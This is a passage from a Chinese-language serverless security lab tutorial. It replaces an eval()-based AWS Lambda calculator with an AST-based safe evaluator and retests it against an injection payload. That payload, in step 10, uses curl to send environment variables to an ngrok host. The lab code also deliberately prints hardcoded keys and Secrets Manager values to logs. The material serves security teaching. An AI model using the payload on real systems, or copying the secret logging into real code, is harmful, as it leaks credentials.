

虽然你可能会倾向于始终使用限制性的 VPC 网络配置来防止通过出站请求进行数据外泄，但仅依赖网络控制不足以防止攻击者利用有漏洞的代码并从无服务器应用程序中外泄敏感数据。请记住，安全编码实践、适当的密钥管理以及应用最小权限原则必须与网络控制相辅相成，才能有效保护你的 Lambda 函数。

在本节中，你将使用更安全的实现更新 Lambda 函数，并通过 AWS 管理控制台部署它。你将从 S3 托管的静态网站测试更新后的函数，以确认其仍按预期正常工作。最后，你将通过重新测试上一节中使用的恶意表达式来确认无效且可能恶意的表达式已被阻止。

### Note

本节假定你正在使用 Serverless Lab 账户，该账户托管了专为易受攻击而设计的无服务器实验环境。

让我们逐步了解更新 Lambda 函数代码以采用更安全实现的步骤：

1. 切回已打开 AWS Lambda 控制台（Serverless Lab 账户）的浏览器标签页。在继续下一步之前，请确保已打开 `lambda-0010` 的 AWS Lambda 函数详细信息页面。

2. 在 AWS Lambda 控制台中，切换到 Configuration 选项卡。然后点击 VPC。

3. 点击 Edit 以打开 Edit VPC 页面。在 VPC 下拉列表中，选择 None（[Figure 7-8](#ch07.html#edit-vpc-to-none)）。

![](assets/lsse_0708.png)

4. 点击 Save 按钮。你应该会收到通知 `Successfully updated the function lambda-0010`。

### Note

你已将函数与其关联的 VPC 分离，因为你希望确保在以下步骤中实现自定义评估器代码按预期工作。这样，你就能验证安全代码实现本身是否有效，而不受 VPC  imposed 的任何网络限制影响。

5. 导航到 Code 选项卡。在“Code source”部分，用以下内容替换现有的 `lambda_function.py` 代码：^([10](#ch07.html#id750))

```
import re
import boto3
import json
import ast
import operator
from os import environ

get_env = environ.get

HARDCODED_KEY_01 = "ABCDE"
HARDCODED_KEY_02 = "FGHIJ"

operators = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.Pow: operator.pow,
    ast.Mod: operator.mod,
    ast.USub: operator.neg,
}


def eval_expr(expr):
    def _eval(node):
        if isinstance(node, ast.Num):
            return node.n
        elif isinstance(node, ast.Constant):
            return node.value
        elif isinstance(node, ast.BinOp):
            return operators[
                type(node.op)
            ](_eval(node.left), _eval(node.right))
        elif isinstance(node, ast.UnaryOp):
            return operators[
                type(node.op)
            ](_eval(node.operand))
        else:
            raise TypeError(
                f"Unsupported expression: {type(node).__name__}"
            )

    try:
        tree = ast.parse(expr, mode='eval')
        return _eval(tree.body)
    except Exception:
        return "Invalid or unsafe expression"


def process_statement(statement):
    if not statement:
        return "No statement parameter value provided"
    return eval_expr(statement)


def get_secret(secret_name, region_name="us-east-1"):
    client = boto3.client("secretsmanager", region_name=region_name)
    response = client.get_secret_value(SecretId=secret_name)
    secret_dict = json.loads(response['SecretString'])

    return secret_dict

def get_statement(event):
    params = event.get('queryStringParameters', {})
    statement = params.get('statement', None)

    return statement


def lambda_handler(event, context):
    print("event: ", event)
    print("HARDCODED_KEY_01: ", HARDCODED_KEY_01)
    print("HARDCODED_KEY_02: ", HARDCODED_KEY_02)
    print("CUSTOM_ENV_VAR_01: ", get_env('CUSTOM_ENV_VAR_01'))
    print("CUSTOM_ENV_VAR_02: ", get_env('CUSTOM_ENV_VAR_02'))

    sm_data = get_secret("prod/lambda-secret")
    print("SECRETS MANAGER SECRETS: ", str(sm_data))

    statement = get_statement(event)
    result = process_statement(statement)

    return {
        'statusCode': 200,
        'headers': {
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "GET,OPTIONS",
            "Access-Control-Allow-Headers": "*"
        },
        'body': result
    }
```

此更新后的 Lambda 函数通过使用 `ast`（抽象语法树，AST）模块用自定义评估器替换 `eval()` 函数，从而引入了一种更安全的数学表达式评估方法。^([11](#ch07.html#id751)) 更具体地说，新的表达式评估函数 `eval_expr()` 通过（1）从输入字符串创建抽象语法树，（2）递归地仅评估安全的节点类型，以及（3）拒绝任何未明确允许的节点，从而防止任意代码执行。这意味着像 `__import__('os').system()` 这样的表达式会被拒绝，因为它们试图执行超出定义的安全算术操作范围的操作。^([12](#ch07.html#id752))

6. 在对 `lambda_function.py` 应用更新后，点击 Deploy。你应该会收到通知 `Successfully updated the function lambda-0010`。

7. 要测试你刚刚部署的 Lambda 函数，点击 Test。这会产生与以下类似的输出响应：

```
Status: Succeeded
Test Event Name: event-0010

Response:
{
  "statusCode": 200,
  "headers": {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET,OPTIONS",
    "Access-Control-Allow-Headers": "*"
  },
  "body": 2
}

Function Logs:
START RequestId: ... Version: $LATEST
event:  {'queryStringParameters': {'statement': '1 + 1'}}
HARDCODED_KEY_01:  ABCDE
HARDCODED_KEY_02:  FGHIJ
CUSTOM_ENV_VAR_01:  KLMNO
CUSTOM_ENV_VAR_02:  PQRST
SECRETS MANAGER SECRETS:  {'secret1': 'secret-value1',
'secret2': 'secret-value2', 'secret3': 'secret-value3'}
END RequestId: ...
REPORT RequestId: ...   Duration: 2122.49 ms    Billed Duration: 2123 ms
Memory Size: 128 MB Max Memory Used: 84 MB  Init Duration: 347.01 ms
```

8. 切回已打开 S3 托管网站的浏览器标签页。

9. 输入并评估以下表达式：^([13](#ch07.html#id753))

```
1 + 2 + 3 / 4
```

这会产生以下输出：

```
3.75
```

### Tip

为确认更新后的 Lambda 函数按预期运行，请尝试使用不同值或运算符评估几个额外表达式。这有助于验证你的输入处理和评估逻辑保持一致。

10. 输入并评估以下表达式以将你的环境变量发送到暴露的 Flask 服务器：

```
__import__('os').system('curl -X POST -d \"$(env)\" https://[GENERATED_ID].ngrok-free.app')
```

### Note

请确保将 `[GENERATED_ID]` 替换为 HTTPS 转发 URL 的 `<ID>` 值。

这会产生以下错误响应：

```
Invalid or unsafe expression
```

